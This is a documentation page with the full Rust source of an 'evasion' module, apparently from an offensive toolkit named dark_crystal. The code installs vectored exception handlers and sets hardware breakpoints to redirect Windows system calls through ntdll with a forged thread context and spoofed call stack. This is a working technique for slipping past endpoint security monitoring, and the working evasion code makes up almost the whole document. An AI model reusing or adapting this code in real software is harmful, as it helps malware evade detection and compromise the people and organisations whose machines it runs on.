# hooks

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crates/core/src/experimental/evasion/veh/hooks.rs` |
| **Lines** | 369 |
| **Cards** | T002-veh-gate |
| **Role** | VEH exception handlers |
| **Inline ASM** | Yes |
| **Unsafe blocks** | 5 |
| **Feature gates** | verbose_debug |

## Types

### struct `SyscallState` (line 28)

## Public API

### `syscall_trampoline` `unsafe` (line 58)
```rust
pub unsafe extern "C" fn syscall_trampoline() {}
```
Trampoline benigno para mantener un call stack limpio

### `initialize_dll_info` (line 60)
```rust
pub fn initialize_dll_info()
```

### `initialize_hooks` (line 309)
```rust
pub fn initialize_hooks()
```

### `destroy_hooks` (line 331)
```rust
pub fn destroy_hooks()
```

### `set_hw_bp` (line 342)
```rust
pub fn set_hw_bp(func_address: usize, flag: i32, ssn: u32)
```

### `take_last_rax` (line 363)
```rust
pub fn take_last_rax() -> Option<u64>
```
Devuelve y limpia el último RAX observado por el handler VEH (si existe).

## Internal Functions

- `AddHwBp` (unsafe) (line 69)
- `HandlerHwBp` (unsafe) (line 115)

## Macros

- `debug_println!` (macro_rules, line 16)

## Key Dependencies

- `use winapi::um::errhandlingapi::{AddVectoredExceptionHandler, RemoveVectoredExceptionHandler};`
- `use winapi::um::winnt::{CONTEXT, EXCEPTION_POINTERS};`
- `use core::ptr;`
- `use crate::evasion::veh::def::{`
- `use crate::evasion::veh::utils::ldr_module_info;`

## Full Source

```rust
use winapi::um::errhandlingapi::{AddVectoredExceptionHandler, RemoveVectoredExceptionHandler};
use winapi::um::winnt::{CONTEXT, EXCEPTION_POINTERS};

use core::ptr;

use crate::evasion::veh::def::{
    DllInfo, CALL_FIRST, EIGHTH_ARGUMENT, ELEVENTH_ARGUMENT, EXCEPTION_ACCESS_VIOLATION,
    EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH, EXCEPTION_SINGLE_STEP, FIFTH_ARGUMENT,
    NINTH_ARGUMENT, OPCODE_CALL, OPCODE_RET, OPCODE_RET_CC, OPCODE_SUB_RSP, OPCODE_SZ_ACC_VIO,
    SEVENTH_ARGUMENT, SIXTH_ARGUMENT, TENTH_ARGUMENT, TRACE_FLAG, TWELVETH_ARGUMENT,
};

use crate::evasion::veh::utils::ldr_module_info;
use std::sync::Mutex;

macro_rules! debug_println {
    ($($arg:tt)*) => {
        #[cfg(feature = "verbose_debug")]
        {
            if crate::selection_config::verbose_debug() {
                println!("[DEBUG VEH] {}", format_args!($($arg)*));
            }
        }
    };
}

#[derive(Default, Clone, Copy)]
struct SyscallState {
    opcode_syscall_off: u64,
    opcode_syscall_ret_off: u64,
    syscall_entry_address: u64,
    is_sub_rsp: i32,
    syscall_no: u32,
    extended_args: bool,
}

static STATE: Mutex<SyscallState> = Mutex::new(SyscallState {
    opcode_syscall_off: 0,
    opcode_syscall_ret_off: 0,
    syscall_entry_address: 0,
    is_sub_rsp: 0,
    syscall_no: 0,
    extended_args: false,
});

static NTDLL_INFO: Mutex<DllInfo> = Mutex::new(DllInfo {
    base_address: 0,
    end_address: 0,
});

static SAVED_CONTEXT: Mutex<Option<Box<CONTEXT>>> = Mutex::new(None);
static LAST_RAX: Mutex<Option<u64>> = Mutex::new(None);

static mut H1: *mut winapi::ctypes::c_void = ptr::null_mut();
static mut H2: *mut winapi::ctypes::c_void = ptr::null_mut();

/// Trampoline benigno para mantener un call stack limpio
pub unsafe extern "C" fn syscall_trampoline() {}

pub fn initialize_dll_info() {
    let (base_addr, size_of_image) = unsafe { ldr_module_info(0x1edab0ed) };
    if let Ok(mut info) = NTDLL_INFO.lock() {
        info.base_address = base_addr as u64;
        info.end_address = unsafe { base_addr.add(size_of_image) } as u64;
    }
}

#[no_mangle]
unsafe extern "system" fn AddHwBp(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
    let exception_info = &*exception_info;

    if (*exception_info.ExceptionRecord).ExceptionCode == EXCEPTION_ACCESS_VIOLATION {
        let entry_address = (*exception_info.ContextRecord).Rcx;

        let mut off_sys = 0;
        let mut off_ret = 0;

        for i in 0..25 {
            if ptr::read((entry_address + i) as *const u8) == 0x0F
                && ptr::read((entry_address + i + 1) as *const u8) == 0x05
            {
                off_sys = i as u64;
                off_ret = i as u64 + 2;
                break;
            }
        }

        if let Ok(mut state) = STATE.lock() {
            state.syscall_entry_address = entry_address;
            state.opcode_syscall_off = off_sys;
            state.opcode_syscall_ret_off = off_ret;

            (*exception_info.ContextRecord).Dr0 = entry_address;
            (*exception_info.ContextRecord).Dr7 |= 1 << 0;

            (*exception_info.ContextRecord).Dr1 = entry_address + off_ret;
            (*exception_info.ContextRecord).Dr7 |= 1 << 2;
        }

        (*exception_info.ContextRecord).Rip += OPCODE_SZ_ACC_VIO;

        debug_println!(
            "HW BP added at {:#x} (sys) and {:#x} (ret)",
            (*exception_info.ContextRecord).Dr0,
            (*exception_info.ContextRecord).Dr1
        );

        return EXCEPTION_CONTINUE_EXECUTION;
    }

    EXCEPTION_CONTINUE_SEARCH
}

#[no_mangle]
unsafe extern "system" fn HandlerHwBp(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
    let exception_info = &*exception_info;

    if (*exception_info.ExceptionRecord).ExceptionCode == EXCEPTION_SINGLE_STEP {
        let (entry_address, ret_address, is_sub_rsp, ssn, extended, sys_off) =
            if let Ok(state) = STATE.lock() {
                (
                    state.syscall_entry_address,
                    state.syscall_entry_address + state.opcode_syscall_ret_off,
                    state.is_sub_rsp,
                    state.syscall_no,
                    state.extended_args,
                    state.opcode_syscall_off,
                )
            } else {
                return EXCEPTION_CONTINUE_SEARCH;
            };

        let (ntdll_base, ntdll_end) = if let Ok(info) = NTDLL_INFO.lock() {
            (info.base_address, info.end_address)
        } else {
            (0, 0)
        };

        if (*exception_info.ExceptionRecord).ExceptionAddress
            == (entry_address as *mut winapi::ctypes::c_void)
        {
            debug_println!(
                "HW BP hit at {:#x} (syscall)",
                (*exception_info.ContextRecord).Rip
            );

            (*exception_info.ContextRecord).Dr0 = 0;
            (*exception_info.ContextRecord).Dr7 &= !(1 << 0);

            if let Ok(mut saved) = SAVED_CONTEXT.lock() {
                let mut ctx = Box::new(std::mem::zeroed::<CONTEXT>());
                ptr::copy_nonoverlapping(exception_info.ContextRecord, ctx.as_mut(), 1);
                *saved = Some(ctx);
            }

            (*exception_info.ContextRecord).Rip = syscall_trampoline as u64;
            (*exception_info.ContextRecord).EFlags |= TRACE_FLAG;

            return EXCEPTION_CONTINUE_EXECUTION;
        } else if (*exception_info.ExceptionRecord).ExceptionAddress
            == (ret_address as *mut winapi::ctypes::c_void)
        {
            debug_println!(
                "HW BP hit at {:#x} (ret)",
                (*exception_info.ContextRecord).Rip
            );

            (*exception_info.ContextRecord).Dr1 = 0;
            (*exception_info.ContextRecord).Dr7 &= !(1 << 2);

            if let Ok(saved) = SAVED_CONTEXT.lock() {
                if let Some(ctx) = saved.as_ref() {
                    (*exception_info.ContextRecord).Rsp = ctx.Rsp;
                }
            }

            if let Ok(mut last) = LAST_RAX.lock() {
                *last = Some((*exception_info.ContextRecord).Rax);
            }

            return EXCEPTION_CONTINUE_EXECUTION;
        } else if (*exception_info.ContextRecord).Rip >= ntdll_base
            && (*exception_info.ContextRecord).Rip <= ntdll_end
        {
            let mut new_is_sub_rsp = is_sub_rsp;

            if is_sub_rsp == 0 {
                for i in 0..80 {
                    let opcode_ret_cc =
                        ptr::read(((*exception_info.ContextRecord).Rip + i as u64) as *const u16);
                    if opcode_ret_cc == OPCODE_RET_CC {
                        break;
                    }
                    let opcode_sub_rsp =
                        ptr::read(((*exception_info.ContextRecord).Rip + i as u64) as *const u32);
                    if (opcode_sub_rsp & 0xffffff) == OPCODE_SUB_RSP {
                        if (opcode_sub_rsp >> 24) >= 0x58 {
                            new_is_sub_rsp = 1;
                            if let Ok(mut state) = STATE.lock() {
                                state.is_sub_rsp = 1;
                            }
                            (*exception_info.ContextRecord).EFlags |= TRACE_FLAG;
                            return EXCEPTION_CONTINUE_EXECUTION;
                        } else {
                            break;
                        }
                    }
                }
            }

            if new_is_sub_rsp == 1 {
                let rip_value = ptr::read((*exception_info.ContextRecord).Rip as *const u16);
                if rip_value == OPCODE_RET_CC || rip_value as u8 == OPCODE_RET {
                    if let Ok(mut state) = STATE.lock() {
                        state.is_sub_rsp = 0;
                    }
                } else if rip_value as u8 == OPCODE_CALL {
                    if let Ok(mut state) = STATE.lock() {
                        state.is_sub_rsp = 2;
                    }
                    (*exception_info.ContextRecord).EFlags |= TRACE_FLAG;
                    return EXCEPTION_CONTINUE_EXECUTION;
                }
            }

            if new_is_sub_rsp == 2 {
                if let Ok(mut state) = STATE.lock() {
                    state.is_sub_rsp = 0;
                }
                debug_println!("Inside ntdll invoking intended syscall (ssn: {:#x})", ssn);

                let temp_rsp = (*exception_info.ContextRecord).Rsp;

                if let Ok(saved) = SAVED_CONTEXT.lock() {
                    if let Some(ctx) = saved.as_ref() {
                        ptr::copy_nonoverlapping(
                            ctx.as_ref() as *const CONTEXT,
                            exception_info.ContextRecord as *mut CONTEXT,
                            1,
                        );

                        (*exception_info.ContextRecord).Rsp = temp_rsp;
                        (*exception_info.ContextRecord).R10 = (*exception_info.ContextRecord).Rcx;
                        (*exception_info.ContextRecord).Rax = ssn as u64;
                        (*exception_info.ContextRecord).Rip = entry_address + sys_off;

                        if extended {
                            let saved_rsp = ctx.Rsp;
                            ptr::copy_nonoverlapping(
                                (saved_rsp + FIFTH_ARGUMENT) as *const u64,
                                ((*exception_info.ContextRecord).Rsp + FIFTH_ARGUMENT) as *mut u64,
                                1,
                            );
                            ptr::copy_nonoverlapping(
                                (saved_rsp + SIXTH_ARGUMENT) as *const u64,
                                ((*exception_info.ContextRecord).Rsp + SIXTH_ARGUMENT) as *mut u64,
                                1,
                            );
                            ptr::copy_nonoverlapping(
                                (saved_rsp + SEVENTH_ARGUMENT) as *const u64,
                                ((*exception_info.ContextRecord).Rsp + SEVENTH_ARGUMENT)
                                    as *mut u64,
                                1,
                            );
                            ptr::copy_nonoverlapping(
                                (saved_rsp + EIGHTH_ARGUMENT) as *const u64,
                                ((*exception_info.ContextRecord).Rsp + EIGHTH_ARGUMENT) as *mut u64,
                                1,
                            );
                            ptr::copy_nonoverlapping(
                                (saved_rsp + NINTH_ARGUMENT) as *const u64,
                                ((*exception_info.ContextRecord).Rsp + NINTH_ARGUMENT) as *mut u64,
                                1,
                            );
                            ptr::copy_nonoverlapping(
                                (saved_rsp + TENTH_ARGUMENT) as *const u64,
                                ((*exception_info.ContextRecord).Rsp + TENTH_ARGUMENT) as *mut u64,
                                1,
                            );
                            ptr::copy_nonoverlapping(
                                (saved_rsp + ELEVENTH_ARGUMENT) as *const u64,
                                ((*exception_info.ContextRecord).Rsp + ELEVENTH_ARGUMENT)
                                    as *mut u64,
                                1,
                            );
                            ptr::copy_nonoverlapping(
                                (saved_rsp + TWELVETH_ARGUMENT) as *const u64,
                                ((*exception_info.ContextRecord).Rsp + TWELVETH_ARGUMENT)
                                    as *mut u64,
                                1,
                            );
                        }
                    }
                }

                (*exception_info.ContextRecord).EFlags &= !TRACE_FLAG;
                return EXCEPTION_CONTINUE_EXECUTION;
            }
        }

        (*exception_info.ContextRecord).EFlags |= TRACE_FLAG;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    EXCEPTION_CONTINUE_SEARCH
}

#[allow(static_mut_refs)]
pub fn initialize_hooks() {
    unsafe {
        H1 = AddVectoredExceptionHandler(CALL_FIRST, Some(AddHwBp));
        if H1.is_null() {
            debug_println!("[!] AddVectoredExceptionHandler(AddHwBp) failed");
            return;
        }

        H2 = AddVectoredExceptionHandler(CALL_FIRST, Some(HandlerHwBp));
        if H2.is_null() {
            RemoveVectoredExceptionHandler(H1);
            H1 = ptr::null_mut();
            debug_println!("[!] AddVectoredExceptionHandler(HandlerHwBp) failed");
            return;
        }

        initialize_dll_info();
        debug_println!("[*] Hooks initialized successfully");
    }
}

#[allow(static_mut_refs)]
pub fn destroy_hooks() {
    unsafe {
        if !H1.is_null() {
            RemoveVectoredExceptionHandler(H1);
        }
        if !H2.is_null() {
            RemoveVectoredExceptionHandler(H2);
        }
    }
}

pub fn set_hw_bp(func_address: usize, flag: i32, ssn: u32) {
    if let Ok(mut state) = STATE.lock() {
        state.extended_args = flag != 0;
        state.syscall_no = ssn;
    }

    // Trigger access violation at the entry point of the function to invoke AddHwBp
    // We pass func_address in RCX, and trigger a crash reading from address 0
    unsafe {
        core::arch::asm!(
            "xor rax, rax",
            "mov edx, dword ptr [rax]", // Trigger access violation using a volatile register
            in("rcx") func_address,
            out("rax") _,
            out("rdx") _,
            clobber_abi("system")
        );
    }
}

/// Devuelve y limpia el último RAX observado por el handler VEH (si existe).
pub fn take_last_rax() -> Option<u64> {
    if let Ok(mut last) = LAST_RAX.lock() {
        last.take()
    } else {
        None
    }
}

```